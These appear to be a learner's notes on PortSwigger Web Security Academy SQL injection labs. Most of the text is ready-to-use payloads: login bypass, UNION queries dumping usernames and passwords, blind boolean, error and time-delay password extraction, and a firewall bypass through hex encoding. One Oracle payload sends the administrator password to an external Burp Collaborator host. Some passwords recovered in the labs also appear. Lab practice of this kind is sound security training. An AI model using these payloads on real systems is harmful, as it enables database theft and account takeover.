32~3SS+ZRr9LQ'Z8FEJPPBSn5{9CqD=R

### SQL Injection 1 Information Leak:

SELECT * FROM products WHERE category = 'Gifts' AND released = 1

SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1

list all products

' or 1=1 --

### SQL Injection 2 Authentication Bypass:

SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'

login as administrator

administrator' --

### SQL Injection 3 Union SQLi Information Leak:

1. Determine number of columns

' union select NULL --

' union select NULL,NULL --

' union select NULL,NULL,NULL --

Actually can guess, cuz there are 3 columns so there are 3 values being pulled from the database

' union select 0,version(),0 --

first field must be a number

second field must be a string

third field must be a number

### SQL Injection 4 Union SQLi Information Leak:

Same as #3, same number of columns based on observation

' union select 0,'B421x0',0 --

### SQL Injection 5 Union SQLi Information Leak:

Number of columns change from 3 to 2 as each record has 2 field - one title and one description

' union select version(),version() --

' union select username,password from users --

### SQL Injection 5 Union SQLi Information Leak 2 columns in 1:

'UNION SELECT 0, username || '~' || password FROM users--

### SQL Injection 6 Union SQLi Information Leak for Oracle

On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name. There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual

https://portswigger.net/web-security/sql-injection/cheat-sheet

'UNION SELECT banner, banner FROM v$version -- 

'UNION SELECT 'abc', 'abc' FROM dual --

### SQL Injection 7 Union SQLi Information Leak for MySQL/Microsoft

`#` must be urlencoded to %23

' UNION SELECT @@version,@@version%23

https://security.stackexchange.com/questions/200383/html-payloads-work-on-burp-but-not-on-browser

### SQL Injection 8 Union SQLi Information Leak

' union select TABLE_NAME,TABLE_NAME from information_schema.tables--

' union select column_name, column_name from information_schema.columns WHERE table_name = 'users_hnvsnr'--

%27+union+select+username_vsghsh,password_dwpobn+from+users_hnvsnr--

### SQL Injection 9 Union SQLi Information Leak

'+union+select+table_name,table_name+from+all_tables-- 

'+union+select+column_name,+column_name+from+all_tab_columns+WHERE+table_name+%3d+'USERS_OJVWEU'--

'+union+select+PASSWORD_INUOPA,+USERNAME_KZOQCW+from+USERS_OJVWEU--

### Lab: Blind SQL injection with conditional responses

'Welcome Back' should be displayed in between 'Home' and 'My account' in an event of a valid trackingId

Query looks like: SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'

asd' AND '1' = '1

SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'asd' AND '1' = '1'

asd' OR '1' = '2 does not have message

asd' OR '1' = '1 have message

asd' OR SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = '§a§

use intruder, clusterbomb, use 2 payloads, 1 for the index of the password, the other for guessing the password itself

PASSWORD GUESSED 7nw8koalr5crmgexwjng

https://www.w3schools.com/sql/func_mysql_substring.asp

https://www.linkedin.com/pulse/basic-tutorial-security-testing-using-burp-force-qa-engineer-

Verify that table with users exist

asd' OR (SELECT table_name from information_schema.tables where table_name='users') = 'users

Find length of password of administrator  

asd' OR (SELECT username from users where username='administrator' and length(password) > 1) = 'administrator

asd' OR (SELECT username from users where username='administrator' and length(password) > 19) = 'administrator

asd' OR (SELECT username from users where username='administrator' and length(password) > 20) = 'administrator

find password

asd' OR SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = '7

asd' OR (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username = 'administrator') = '7

### Lab: Blind SQL injection with conditional errors

Cookie: TrackingId=xyz' and (SELECT '1' FROM dual) = 'a' --; session=zqy720HBisRgWvbWKN3e4qNSwms2cPo0 # no 500 errors

Cookie: TrackingId=xyz' and (SELECT 1 FROM dual) = 'a' --; session=zqy720HBisRgWvbWKN3e4qNSwms2cPo0 # create 500 error

Cookie: TrackingId=xyz' || (SELECT CASE WHEN ('1' = '1') THEN TO_CHAR(1/0) ELSE NULL END FROM dual) --; session=zqy720HBisRgWvbWKN3e4qNSwms2cPo0 # creates 500 error as '1' does equal to '1' and it then proceeds to run TO_CHAR(1/0) which crashes the program 

Cookie: TrackingId=xyz' || (SELECT CASE WHEN ('1' = '2') THEN TO_CHAR(1/0) ELSE NULL END FROM dual) --; session=zqy720HBisRgWvbWKN3e4qNSwms2cPo0 # no 500 error as '1' does not equal to '2' hence NULL is returned and concatenated to xyz

https://www.techonthenet.com/oracle/functions/concat2.php

Cookie: TrackingId=xyz' UNION (SELECT CASE WHEN ('1' = '2') THEN TO_CHAR(1/0) ELSE NULL END FROM dual) --; session=zqy720HBisRgWvbWKN3e4qNSwms2cPo0 # no 500 error as '1' does not equal to '2' hence NULL is returned and concatenated to xyz

union select also works fine

Cookie: TrackingId=xyz' UNION (SELECT CASE WHEN ((SELECT version FROM v$instance) = '2') THEN TO_CHAR(1/0) ELSE NULL END FROM dual) --; session=zqy720HBisRgWvbWKN3e4qNSwms2cPo0

Cookie: TrackingId=xyz' UNION (SELECT CASE WHEN ((SELECT version FROM v$instance) = (SELECT version FROM v$instance)) THEN TO_CHAR(1/0) ELSE NULL END FROM dual) --; session=zqy720HBisRgWvbWKN3e4qNSwms2cPo0

https://portswigger.net/web-security/sql-injection/cheat-sheet

Cookie: TrackingId=xyz' UNION (SELECT CASE WHEN LENGTH(table_name) > 1 THEN TO_CHAR(1/0) ELSE '' END FROM dba_tables WHERE table_name='users') --; session=zqy720HBisRgWvbWKN3e4qNSwms2cPo0 # could not get exploit for verifying table name to work :(

Cookie: TrackingId=xyz' UNION (SELECT CASE WHEN SUBSTR(password, 1, 1) = 'j' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') --; session=zqy720HBisRgWvbWKN3e4qNSwms2cPo0

Cookie: TrackingId=xyz' UNION (SELECT CASE WHEN LENGTH(password) = 20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') --; session=zqy720HBisRgWvbWKN3e4qNSwms2cPo0

https://stackoverflow.com/questions/205736/get-list-of-all-tables-in-oracle

https://portswigger.net/web-security/sql-injection/cheat-sheet

### Lab: Blind SQL injection with time delays

Cookie: TrackingId=asd' || pg_sleep(10) --; session=86lXMWhZqasRsn2qNeA0Og2CgVPfeiQm

https://portswigger.net/web-security/sql-injection/cheat-sheet

### Lab: Blind SQL injection with time delays and information retrieval

Cookie: TrackingId=z6yzkpurwwaFGhVf'%3b SELECT CASE WHEN (LENGTH(password) = 20) THEN pg_sleep(10) ELSE pg_sleep(0) END from users where username = 'administrator' --; session=JanLFZVDPB8foWtw6iQlmWuDhEBGb8pt

Cookie: TrackingId=z6yzkpurwwaFGhVf'%3b SELECT CASE WHEN (SUBSTRING(password, 1, 1) = 'a') THEN pg_sleep(10) ELSE pg_sleep(0) END from users where username = 'administrator' --; session=JanLFZVDPB8foWtw6iQlmWuDhEBGb8pt

```
GET / HTTP/1.1
Host: 0ae8003903c64469c0d364e400a5006b.web-security-academy.net
Cookie: TrackingId=z6yzkpurwwaFGhVf'%3b SELECT CASE WHEN (SUBSTRING(password, §2§, 1) = '§a§') THEN pg_sleep(10) ELSE pg_sleep(0) END from users where username = 'administrator' --; session=JanLFZVDPB8foWtw6iQlmWuDhEBGb8pt
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

https://www.postgresqltutorial.com/postgresql-tutorial/postgresql-case/

https://postgrespro.com/docs/postgresql/9.5/functions-string

### Lab: Blind SQL injection with out-of-band interaction

GET / HTTP/1.1
Host: 0a160007037cd3b1c0bff98600720050.web-security-academy.net
Cookie: TrackingId=2i25KlUcCmG4QhR7'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//t601jdr08annpyvgxpqi2l1txk3arz.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual+--; session=MJaKM2o99ECAa5BF0RIgONyaU5DNSYg5

https://portswigger.net/web-security/sql-injection/cheat-sheet

make sure url encode key characters

### Lab: Blind SQL injection with out-of-band data exfiltration

GET / HTTP/1.1
Host: 0aa0008304a16dd1c06b28ab00bb00ce.web-security-academy.net
Cookie: TrackingId=kVgKSt9x4Xeygwi8'+union+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+from+users where username = 'administrator')||'.1ce9plx8eitvv61o3xwq8t713s9jx8.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual+--; session=ImvxJ6roYG9IPaNy6LvQC4I6CT14bUvb

https://portswigger.net/web-security/sql-injection/cheat-sheet

make sure url encode key characters

### Lab: SQL injection with filter bypass via XML encoding

3' and union select * from users --

2' union select NUL

FIREWALL blocking SQLi

use hackvector to obfsucate SQLi. it works because we are using xml to transfer the data

<@hex_entities>1 UNION SELECT NULL<@/hex_entities>

<@hex_entities>1 UNION SELECT version()<@/hex_entities>

<@hex_entities>1 UNION SELECT column_name from information_schema.COLUMNS WHERE TABLE_NAME='users'<@/hex_entities>

<@hex_entities>1 UNION SELECT password from users<@/hex_entities>

<@hex_entities>1 UNION SELECT username from users<@/hex_entities>

q8zhonzenah72u81y5mr

3keuef9qr4h7p04u3lwm

dunq21ctv50s6pwblx7g

carlos

administrator

weiner

### Beyond Lab 1: Second Order SQL injection

https://www.youtube.com/watch?v=e9pbC5BxiAE

https://0xdf.gitlab.io/2019/01/19/htb-secnotes.html#beyond-root

https://portswigger.net/kb/issues/00100210_sql-injection-second-order

